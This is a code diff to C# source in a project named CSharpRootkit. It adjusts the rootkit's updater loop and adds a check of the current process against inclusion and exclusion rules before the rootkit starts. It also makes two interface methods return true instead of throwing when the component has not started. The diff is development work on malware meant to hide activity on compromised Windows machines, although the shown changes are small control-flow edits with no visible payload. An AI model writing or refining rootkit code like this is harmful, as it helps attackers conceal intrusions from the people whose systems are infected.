@@ -108,11 +108,11 @@ namespace CSharpRootkit
 
             started = false;
             
-            try
-            {
-                UpdaterThread.Abort();
-            }
-            catch { }
+            //try
+            //{
+            //    UpdaterThread.Abort();
+            //}
+            //catch { }
         }
 
         private static void UpdaterLoop() //if error in the file update, it causes entire thing to stop.
@@ -129,7 +129,6 @@ namespace CSharpRootkit
                         errorCount = 0;
                         ProcessMemoryFileUpdates();
                     }
-                    Thread.Sleep(1000);
                 }
                 catch
                 {
@@ -141,6 +140,7 @@ namespace CSharpRootkit
                     }
 
                 }
+                Thread.Sleep(1000);
             }
         }
 
@@ -166,7 +166,7 @@ namespace CSharpRootkit
                 }
 
 
-                if (GetRootKitStatus())// && make sure that its not excluded/not included/etc
+                if (GetRootKitStatus() && !IsAgainstInclusionExclusionRules(NativeMethods.GetCurrentProcess()))// && make sure that its not excluded/not included/etc
                 {
                     if (!RootKit.Started)
                     {
@@ -440,7 +440,8 @@ namespace CSharpRootkit
         {
             if (!started)
             {
-                throw new Exception("This interface has not been started!");
+                return true;
+                //throw new Exception("This interface has not been started!");
             }
 
 
@@ -479,7 +480,8 @@ namespace CSharpRootkit
         {
             if (!started)
             {
-                throw new Exception("This interface has not been started!");
+                return true;
+                //throw new Exception("This interface has not been started!");
             }
 
             bool isInclusion = IsInclusionMode();
